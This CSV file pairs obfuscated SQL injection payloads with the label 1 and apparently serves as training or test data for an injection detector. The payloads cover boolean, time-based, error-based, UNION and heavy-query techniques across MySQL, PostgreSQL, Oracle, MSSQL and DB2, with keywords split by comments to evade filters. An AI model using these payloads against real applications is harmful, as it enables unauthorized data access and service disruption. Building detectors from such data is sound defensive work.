Query,Label
-8069'   )    )    o/**/r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selec/**/t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a/**/nd    (    (   'qbvz'  =  'qbvz,1
"sel/**/ect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    a/**/nd ""%""  =  """,1
"-6890""   )    )    o/**/r 5903  =    (  'qqpjq'||  (  se/**/lect case 5903 when 5903 then 1 else 0 end fro/**/m rdb$dat/**/abase  )  ||'qzvzq'  )   a/**/nd    (    (   ""ftho"" li/**/ke ""ftho",1
"1%'   )    )    union all se/**/lect n/**/ull,n/**/ull,nu/**/ll--",1
-3998'   )    )    o/**/r 3038  =  3038,1
"-2862'   )    )     )   union all sele/**/ct 6649,6649--",1
"1   )    )    o/**/r 4411  =    (  s/**/elect count  (  *  )   fr/**/om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a/**/nd    (    (   3003  =  3003",1
"1 wh/**/ere 3175  =  3175 o/**/r 8421  =    (  sele/**/ct count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )   --",1
 (  sel/**/ect   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  se/**/lect 6986 fr/**/om mysql.db  )   end   )    ) ,1
"1 a/**/nd 3202  =  lik/**/e  (  'abcdefg',upper  (  hex  (  ra/**/ndomblob  (  500000000/2   )    )      )    )   -- kegk",1
"-9583'   )    )    union all s/**/elect 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1
1%'   )    )     )   a/**/nd 3715 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selec/**/t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (     (  '%'  =  ',1
1%' an/**/d   (  se/**/lect * f/**/rom   (  selec/**/t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"-5391 o/**/r make_s/**/et  (  9354  =  9354,7185  )  # ptyy",1
"-5322"" union all se/**/lect 6494,6494,6494,6494,6494,6494--",1
selec/**/t sleep  (  5  )   a/**/nd    (    (     (  8354  =  8354,1
"1 an/**/d elt  (  4249  =  4249,7259  )  -- meef",1
1' i/**/n boolean mode  )   o/**/r   (  sele/**/ct * fro/**/m   (  sel/**/ect  (  sleep  (  5   )    )     )  ydpu  )  #,1
"1""  )   as ypfa wher/**/e 6128  =  6128",1
1'+  (  selec/**/t plhk wher/**/e 6540  =  6540,1
"-3102  )   union all se/**/lect 6707,6707,6707,6707--",1
"1 an/**/d 4241  =  convert  (  i/**/nt,  (  sele/**/ct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele/**/ct   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-9634'   )    )     )   union all selec/**/t 4141,4141#",1
"-5640""   )    )    o/**/r 9792  =  2728--",1
"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se/**/lect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a/**/nd 'ctac' li/**/ke 'ctac",1
-5764 o/**/r 3038  =  3038,1
se/**/lect   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  sele/**/ct 4996 fro/**/m master..sysdatabas/**/es  )   end  )  --,1
"sele/**/ct count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d   (  ""snwx"" li/**/ke ""snwx",1
1 union all sel/**/ect nu/**/ll--,1
"selec/**/t count  (  *  )   f/**/rom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an/**/d    (    (   ""%""  =  """,1
1' wher/**/e 8159  =  8159 union all s/**/elect nu/**/ll#,1
"1""  )   as uuth wher/**/e 8555  =  8555 union all se/**/lect nul/**/l,n/**/ull#",1
"-6194"" o/**/r 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"sel/**/ect * f/**/rom generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limi/**/t 1--",1
"call regexp_substri/**/ng  (  repeat  (  right  (  char  (  2385  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
-4313%'  )   o/**/r 6872  =  6872 an/**/d   (  '%'  =  ',1
1'   )    )     )   an/**/d 6969  =    (  sel/**/ect 6969 f/**/rom pg_sleep  (  5   )    )    an/**/d    (    (     (  'eihl'  =  'eihl,1
selec/**/t   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  s/**/elect 3140 fro/**/m master..sysd/**/atabases  )   end  )  --,1
"-9861' union all se/**/lect 5710,5710,5710,5710,5710--",1
"1 wh/**/ere 8273  =  8273 union all sele/**/ct nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l#",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as swix whe/**/re 2459  =  2459 o/**/r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1   )    )     )   a/**/nd   (  se/**/lect 9067 fr/**/om  (  selec/**/t count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )   an/**/d    (    (     (  8382  =  8382",1
1  )   as selm wher/**/e 5759  =  5759,1
"-6112""  )   union all se/**/lect 8203,8203,8203,8203,8203,8203,8203--",1
-8369  )   wher/**/e 7234  =  7234 o/**/rd/**/er b/**/y 1--,1
"1' o/**/r elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"1""   )    )     )   union all se/**/lect n/**/ull,nul/**/l#",1
"1   )    )     )   an/**/d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,nu/**/ll  )   an/**/d    (    (     (  2997  =  2997",1
"sel/**/ect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    an/**/d   (  ""%""  =  """,1
1'||  (  s/**/elect 'zqwd' wh/**/ere 1647  =  1647 rlik/**/e sleep  (  5   )    )   ||',1
"1""   )    )     )    (  selec/**/t   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n/**/ull  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f/**/rom   (  val/**/ues  (  0   )    )     )   a/**/nd    (    (     (  ""fcpm""  =  ""fcpm",1
1 whe/**/re 2239  =  2239 a/**/nd 6969  =    (  se/**/lect 6969 fr/**/om pg_sleep  (  5   )    )   --,1
1'||  (  s/**/elect 'xemx' f/**/rom dual wh/**/ere 4683  =  4683 o/**/r sleep  (  5  )  #,1
s/**/elect   (  case when   (  4291  =  6937  )   then 4291 else 4291*  (  s/**/elect 4291 f/**/rom mysql.db  )   end  )  #,1
"1""  )   w/**/here 8462  =  8462 a/**/nd u/**/pdatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sele/**/ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"-1055' union all s/**/elect 7758,7758,7758,7758,7758,7758--",1
"-2630'   )    )    as xavw wh/**/ere 6291  =  6291 union all s/**/elect 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1
"1' w/**/here 8451  =  8451 union all selec/**/t nul/**/l,nu/**/ll,nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l,nul/**/l,nul/**/l#",1
1' wh/**/ere 8635  =  8635 o/**/rd/**/er b/**/y 1--,1
-8447 whe/**/re 2850  =  2850 o/**/r 7147  =  3262,1
"1 an/**/d elt  (  4249  =  4249,7259  )  ",1
"1%'   )    )    o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1"" wher/**/e 6179  =  6179",1
1'  )   wh/**/ere 6842  =  6842,1
"1'   )    )    as qzyp whe/**/re 5081  =  5081 o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
-3937   )    )    o/**/r 3038  =  3038,1
"1%' o/**/r 8315  =    (  sel/**/ect count  (  *  )   fro/**/m sysibm.systabl/**/es as t1,sysibm.systabl/**/es as t2,sysibm.systabl/**/es as t3  )   an/**/d '%'  =  '",1
1'+  (  se/**/lect 'diet' wher/**/e 7004  =  7004 rl/**/ike sleep  (  5   )    )   +',1
1'  )   as cdrm whe/**/re 4595  =  4595 o/**/r/**/der b/**/y 1#,1
"1""   )    )    as zbfj wh/**/ere 2285  =  2285",1
"1'  )   wh/**/ere 4407  =  4407 an/**/d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul/**/l  )  ,0  )  ,500000000  )  ,n/**/ull  )  --",1
1 an/**/d 4595  =  4595#,1
-9429'  )   o/**/rd/**/er b/**/y 1--,1
1%'   )    )    rli/**/ke   (  se/**/lect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    an/**/d    (    (   '%'  =  ',1
"1""   )    )    a/**/nd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    an/**/d    (    (   ""alkz""  =  ""alkz",1
s/**/elect   (  case when   (  5152  =  7853  )   then 5152 else 5152*  (  s/**/elect 5152 fro/**/m mysql.db  )   end  )  #,1
"1%"" union all s/**/elect nul/**/l,nu/**/ll,n/**/ull,nu/**/ll,n/**/ull,n/**/ull#",1
"1 o/**/r 5356  =    (  sele/**/ct count  (  *  )   fro/**/m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   an/**/d 8514  =    (  se/**/lect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.tab/**/les as t3  )   a/**/nd    (    (     (  'peyy'  =  'peyy",1
"1  )   a/**/nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1  )   as zmjm wher/**/e 9125  =  9125 o/**/r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substri/**/ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nul/**/l  )  --",1
"-7802'   )    )     )   o/**/r elt  (  8778  =  9974,9974  )   an/**/d    (    (     (  'glsq' li/**/ke 'glsq",1
1 o/**/r sleep  (  5  )  #,1
"1"" a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )    an/**/d ""zhxm""  =  ""zhxm",1
"1   )    )    as myyh wh/**/ere 5116  =  5116 o/**/r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1',  (  se/**/lect   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  sel/**/ect 4209 f/**/rom i/**/nfo/**/rmation_schema.character_se/**/ts  )   end   )    )   ",1
1'  )   rlik/**/e   (  s/**/elect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    a/**/nd   (  'gzpx'  =  'gzpx,1
"1'  )   o/**/r   (  sele/**/ct 2*  (  if   (    (   sel/**/ect * f/**/rom   (  selec/**/t concat  (  0x7171706a71,  (  se/**/lect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   a/**/nd   (  'bzgs' li/**/ke 'bzgs",1
"-2314""   )    )    o/**/r make_se/**/t  (  9354  =  9354,7185  )   an/**/d    (    (   ""uatq"" li/**/ke ""uatq",1
"sele/**/ct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    an/**/d   (  'dvpw'  =  'dvpw",1
"1'   )    )    as nxhp wh/**/ere 2649  =  2649 o/**/r 9643  =    (  se/**/lect count  (  *  )   fro/**/m domai/**/n.domai/**/ns as t1,domai/**/n.columns as t2,domai/**/n.ta/**/bles as t3  )  --",1
"-2287'   )    )    union all selec/**/t 1200,1200,1200,1200,1200#",1
"-6184""   )    )    o/**/r 2724 i/**/n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se/**/lect   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a/**/nd    (    (   ""rovr""  =  ""rovr",1
s/**/elect   (  case when   (  6002  =  9048  )   then 6002 else 6002*  (  selec/**/t 6002 fro/**/m mysql.db  )   end  )  #,1
1'||  (  selec/**/t 'ywfo' fro/**/m dual wher/**/e 4168  =  4168 rl/**/ike sleep  (  5  )  #,1
"1"" o/**/r 6793  =    (  selec/**/t 6793 fro/**/m pg_sleep  (  5   )    )    an/**/d ""pwwb"" lik/**/e ""pwwb",1
"1%'   )    )     )    (  s/**/elect   (  case when   (  4587  =  4587  )   then regexp_substri/**/ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu/**/ll  )  ,0  )  ,500000000  )  ,nul/**/l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   fr/**/om   (  val/**/ues  (  0   )    )     )   an/**/d    (    (     (  '%'  =  '",1
"1""   )    )    a/**/nd   (  selec/**/t 2*  (  if   (    (   selec/**/t * f/**/rom   (  selec/**/t concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   an/**/d    (    (   ""llgb"" lik/**/e ""llgb",1
"-5202 union all se/**/lect 5332,5332,5332,5332,5332,5332,5332#",1
"1""  )   a/**/nd 6969  =    (  sel/**/ect 6969 f/**/rom pg_sleep  (  5   )    )    a/**/nd   (  ""btht""  =  ""btht",1
"-6307' w/**/here 8916  =  8916 union all sel/**/ect 8916,8916,8916,8916,8916,8916,8916--",1
"1' i/**/n boolean mode  )   o/**/r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selec/**/t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1
1   )    )    union all se/**/lect n/**/ull#,1
"-4955%' union all selec/**/t 5928,5928--",1
"1' a/**/nd elt  (  2266  =  7467,7467  )  ",1
1' a/**/nd   (  s/**/elect * fr/**/om   (  sel/**/ect  (  sleep  (  5   )    )     )  fzno  )   a/**/nd 'mepp'  =  'mepp,1
"1,  (  sele/**/ct   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  sele/**/ct 3717 fr/**/om master..sysdat/**/abases  )   end   )    )   ",1
"1'  )   o/**/r elt  (  6272  =  6272,sleep  (  5   )    )    an/**/d   (  'tmbs'  =  'tmbs",1
-4901  )   o/**/r 3407  =  6442#,1
1' w/**/here 4134  =  4134 a/**/nd 1102  =  6300--,1
"1'   )    )     )   an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    a/**/nd    (    (     (  'hllf'  =  'hllf",1
"-1598""   )    )    o/**/r elt  (  5329  =  9628,9628  )   a/**/nd    (    (   ""hyxq"" l/**/ike ""hyxq",1
 (  sele/**/ct * fr/**/om   (  se/**/lect  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1""  )   o/**/r   (  s/**/elect * fro/**/m   (  sel/**/ect  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3604'  )   as fyev whe/**/re 7259  =  7259 union all s/**/elect 7259,7259,7259,7259--",1
-6433%'   )    )    o/**/r 9323  =  9323#,1
-8836%'  )   o/**/r 4856  =  3891,1
"1 a/**/nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1%'   )    )    o/**/r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   a/**/nd    (    (   '%'  =  '",1
 (  7098  =  7098 a/**/nd sleep  (  5   )    ) ,1
"1""  )   as jiyl whe/**/re 4893  =  4893 union all se/**/lect n/**/ull,nul/**/l,nu/**/ll,n/**/ull,nu/**/ll#",1
-3243 o/**/r 2266  =  3583#,1
"1'  )   union all s/**/elect nu/**/ll,n/**/ull,nul/**/l,n/**/ull,nul/**/l--",1
"1%""   )    )     )   an/**/d 3202  =  li/**/ke  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )    an/**/d    (    (     (  ""%""  =  """,1
"1' an/**/d extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sel/**/ect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    an/**/d 'pphf'  =  'pphf",1
"1""   )    )    rli/**/ke   (  selec/**/t * f/**/rom   (  selec/**/t  (  sleep  (  5   )    )     )  sgvo  )   an/**/d    (    (   ""bxct"" li/**/ke ""bxct",1
-9120'   )    )    o/**/r 8571  =  8571--,1
1'+  (  s/**/elect naiw w/**/here 4924  =  4924,1
-9389'  )   o/**/r 8859  =  3989--,1
"-9923%'   )    )     )   union all sele/**/ct 8985,8985,8985,8985,8985,8985,8985#",1
1'   )    )    an/**/d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   fro/**/m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   'hbwk' l/**/ike 'hbwk,1
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  s/**/elect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   an/**/d   (  ""tgdu""  =  ""tgdu",1
"-1510'   )    )     )   union all sel/**/ect 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
"1""  )   union all s/**/elect n/**/ull,nu/**/ll,nu/**/ll,nul/**/l,nul/**/l,n/**/ull,nul/**/l#",1
"elt  (  8192  =  8192,sleep  (  5   )    )   ",1
end an/**/d    (    (   'zeyr'  =  'zeyr,1
"1""   )    )    as luon wher/**/e 4676  =  4676 rl/**/ike sleep  (  5  )  #",1
"1""  )   whe/**/re 6138  =  6138 an/**/d 8594  =    (  sele/**/ct 8594 f/**/rom pg_sleep  (  5   )    )   --",1
"1"" wher/**/e 3740  =  3740 rlik/**/e sleep  (  5  )  #",1
"1'   )    )     )   a/**/nd elt  (  4249  =  4249,7259  )   a/**/nd    (    (     (  'kgdt' li/**/ke 'kgdt",1
1  )   as tngy wher/**/e 8956  =  8956 rl/**/ike   (  se/**/lect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"-4230""   )    )     )   union all se/**/lect 6962,6962,6962,6962,6962,6962#",1
-3540 wher/**/e 7302  =  7302 o/**/r 4493  =  utl_i/**/naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1  )   as lfra w/**/here 2669  =  2669 a/**/nd up/**/datexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selec/**/t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
1'  )   rlik/**/e sleep  (  5  )   an/**/d   (  'qsub' li/**/ke 'qsub,1
"1%""   )    )     )   union all sel/**/ect nul/**/l,nu/**/ll,nu/**/ll,nul/**/l,n/**/ull,n/**/ull,nu/**/ll,nul/**/l--",1
"1'+  (  s/**/elect 'uzaw' whe/**/re 9900  =  9900 o/**/r 8315  =    (  s/**/elect count  (  *  )   fr/**/om sysibm.systa/**/bles as t1,sysibm.systa/**/bles as t2,sysibm.systabl/**/es as t3   )    )   +'",1
"1""  )   as dlfq wh/**/ere 8410  =  8410",1
"1  )   as guru w/**/here 7615  =  7615 union all selec/**/t nul/**/l,nul/**/l,nu/**/ll,n/**/ull,n/**/ull,n/**/ull,nu/**/ll,n/**/ull,n/**/ull,n/**/ull#",1
"1  )   a/**/nd make_s/**/et  (  1559  =  4863,4863  )  ",1
-9484' o/**/r   (  7129  =  2349  )  *2349 an/**/d 'fcsa' lik/**/e 'fcsa,1
"1'  )   o/**/r   (  s/**/elect 9173 f/**/rom  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_se/**/ts group b/**/y x  )  a  )  ",1
"1"" w/**/here 5328  =  5328 a/**/nd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   union all se/**/lect n/**/ull,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll,nu/**/ll#",1
1'  )   as ihsc w/**/here 3978  =  3978,1
"-6125'||  (  sele/**/ct 'hwnm' w/**/here 1428  =  1428 union all selec/**/t 1428,1428,1428,1428,1428,1428#",1
selec/**/t   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as i/**/nt  )  /  (  sel/**/ect 0 fro/**/m dual  )   end  )   fr/**/om dual--,1
1 rli/**/ke   (  sele/**/ct * fro/**/m   (  sele/**/ct  (  sleep  (  5   )    )     )  sgvo  ) ,1
"1'   )    )    an/**/d row  (  6237,7469  )  >  (  s/**/elect count  (  *  )  ,concat  (  0x7171706a71,  (  s/**/elect   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fro/**/m   (  selec/**/t 5192 union s/**/elect 3785 union se/**/lect 3931 union sel/**/ect 7158  )  a group b/**/y x  )   a/**/nd    (    (   'pbtf'  =  'pbtf",1
"1'  )   whe/**/re 7391  =  7391 o/**/r   (  selec/**/t 9173 fro/**/m  (  sel/**/ect count  (  *  )  ,concat  (  0x7171706a71,  (  selec/**/t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo/**/r  (  ra/**/nd  (  0  )  *2   )    )   x fr/**/om i/**/nfo/**/rmation_schema.character_s/**/ets group b/**/y x  )  a  )  --",1
1'+  (  se/**/lect dklj wh/**/ere 3265  =  3265,1
"1'  )   an/**/d 3202  =  l/**/ike  (  'abcdefg',upper  (  hex  (  ran/**/domblob  (  500000000/2   )    )      )    )   ",1
"1'   )    )    an/**/d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selec/**/t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   fr/**/om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   a/**/nd    (    (   'cbwx'  =  'cbwx",1
